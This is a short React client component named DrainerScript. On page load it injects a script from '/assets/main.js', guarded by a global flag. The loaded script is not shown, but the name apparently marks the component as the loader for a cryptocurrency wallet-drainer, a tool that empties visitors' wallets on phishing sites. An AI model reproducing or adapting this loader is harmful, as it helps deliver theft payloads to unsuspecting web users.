"use client";
import { useEffect } from 'react';

export default function DrainerScript() {
    useEffect(() => {
        if (window.init_co) return;

        const script = document.createElement('script');
        script.src = '/assets/main.js';
        script.async = true;
        document.body.appendChild(script);

        return () => {
            if (document.body.contains(script)) {
                document.body.removeChild(script);
            }
        };
    }, []);

    return null;
}